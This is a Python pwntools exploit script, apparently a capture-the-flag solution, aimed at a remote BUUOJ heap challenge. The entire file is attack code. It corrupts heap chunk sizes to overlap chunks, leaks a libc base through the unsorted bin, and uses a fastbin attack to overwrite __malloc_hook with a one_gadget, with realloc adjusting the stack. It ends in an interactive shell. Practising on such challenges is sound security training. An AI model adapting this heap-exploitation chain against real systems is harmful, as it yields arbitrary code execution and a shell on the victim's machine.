from pwn import *

sh=remote("node5.buuoj.cn",27147)
libc=ELF("./libc-2.23.so")

def alloc(size):
	sh.recvuntil(b'choice: ')
	sh.sendline(b'1')
	sh.sendlineafter(b'size: ', str(size))
 
def edit(index, size, content):
	sh.sendlineafter(b'choice: ', b'2')
	sh.sendlineafter(b'index: ', str(index))
	sh.sendlineafter(b'size: ', str(size))
	sh.sendafter(b'content', content)
 
def free(index):
	sh.sendlineafter(b'choice: ', b'3')
	sh.sendlineafter(b'index: ', str(index))
 
def show(index):
	sh.sendlineafter(b'choice: ', b'4')
	sh.sendlineafter(b'index: ', str(index))


alloc(0x18) #0
alloc(0x10) #1
alloc(0x90) #2
alloc(0x10) #3

payload=0x10*b'a'+p64(0x20)+b"\xa1"
edit(0,0x18+10,payload)
payload=0xe*p64(0)+p64(0xa0)+p64(0x21)
edit(2,0x80,payload)

free(1)
alloc(0x90)
payload=3*p64(0)+p64(0xa1)
edit(1,0x20,payload)

free(2)
show(1)
libc_base=u64(sh.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))-0x3c4b78
print("libc_base=",hex(libc_base))

malloc_hook = libc_base+libc.sym["__malloc_hook"]
realloc_hook = libc_base+libc.sym["realloc"]

alloc(0x80) #2
payload = p64(0)*3+p64(0x71)+p64(0)*12 + p64(0x70) + p64(0x21)
edit(1,0x90,payload)
free(2)

payload = p64(0)*3 + p64(0x71) + p64(malloc_hook - 0x23)*2
edit(1,0x30,payload)
alloc(0x60)
alloc(0x60)

one_gadget = libc_base + 0xf1147

payload = b"a"*11 + p64(one_gadget) + p64(realloc_hook+4)
edit(4,27,payload)

alloc(0x60)
sh.interactive()
